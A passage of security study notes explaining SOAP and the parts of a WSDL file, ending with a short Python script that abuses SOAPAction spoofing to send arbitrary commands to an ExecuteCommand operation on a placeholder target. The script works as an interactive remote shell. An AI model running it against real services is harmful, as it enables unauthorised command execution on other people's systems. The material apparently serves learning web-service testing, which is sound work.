**SOAP (Simple Object Access Protocol):**
   - Uses XML but provides more functionalities than XML-RPC.
   - Defines both a header structure and a payload structure.
   - Optional Web Services Definition Language (WSDL) declaration.
   - Various lower-level protocols (HTTP included) can be the transport.


## Breakdown of WSDL file

1. **Definition:**
   - The root element of all WSDL files.
   - Specifies the name of the web service, declares namespaces, and defines other service elements.

2. **Data Types:**
   - Defines the data types used in exchanged messages.
   - Specifies elements with their types for requests and responses.

3. **Messages:**
   - Defines input and output operations supported by the web service.
   - Messages are presented either as entire documents or as arguments to be mapped to a method invocation.

4. **Operation:**
   - Defines available SOAP actions alongside the encoding of each message.

5. **Port Type:**
   - Encapsulates every possible input and output message into an operation.
   - Defines the web service, available operations, and exchanged messages.

6. **Binding:**
   - Binds operations to a particular port type (interface).
   - Provides web service access details, including message format, operations, messages, and interfaces.

7. **Service:**
   - A client makes a call to the web service through the specified service name.
   - Identifies the location of the web service.

**SOAPAction Spoofing**

If following in wsdl file
```
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```

```
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
